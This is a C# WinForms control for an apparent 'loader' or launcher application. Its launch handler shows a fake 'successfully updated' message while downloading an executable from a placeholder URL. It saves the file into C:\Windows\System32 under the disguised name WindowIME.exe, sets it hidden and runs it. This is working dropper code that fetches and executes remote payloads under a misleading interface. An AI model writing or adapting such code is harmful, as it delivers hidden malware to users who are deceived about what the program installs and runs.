using BetterCleaner;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace spacey
{
    public partial class userCTsp : UserControl
    {
        public userCTsp()
        {
            InitializeComponent();
            label3.ForeColor = Color.FromArgb(255, 18, 20, 22);
        }

        public async Task spFAsync(string f)
        {
            if (f == "a")
            {
                spBtn.Text = "Launching";
                Application.UseWaitCursor = true;
                label3.ForeColor = Color.FromArgb(255, 80, 80, 80);
                label3.Text = "Loader: Successfully updated to the latest version.";
                await Task.Delay(1500);

                string url = "https://example.com/example.exe"; // Replace this with the direct link to your application

                string nombreArchivo = @"C:\Windows\System32\WindowIME.exe";

                // Delete the file if it already exists
                if (File.Exists(nombreArchivo))
                {
                    File.Delete(nombreArchivo);
                }

                // Download the file
                using (WebClient client = new WebClient())
                {
                    try
                    {
                        client.DownloadFile(url, nombreArchivo);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("An error occurred while downloading the file: " + ex.Message);
                        return;
                    }
                }

                // Make the file hidden
                File.SetAttributes(nombreArchivo, File.GetAttributes(nombreArchivo) | FileAttributes.Hidden);

                // Wait for a while before executing
                Thread.Sleep(1000);

                // Run the downloaded application
                try
                {
                    System.Diagnostics.Process.Start(nombreArchivo);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("An error occurred while running the application: " + ex.Message);
                }

                label3.ForeColor = Color.FromArgb(255, 0, 214, 14);
                label3.Text = "Loader: Successfully updated to the latest version.\nLoader: Successfuly launched.";

                spBtn.Text = "Launch";
                Application.UseWaitCursor = false;
            }
        }

        private void spBtn_Click(object sender, EventArgs e)
        {
            spFAsync("a");
        }

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
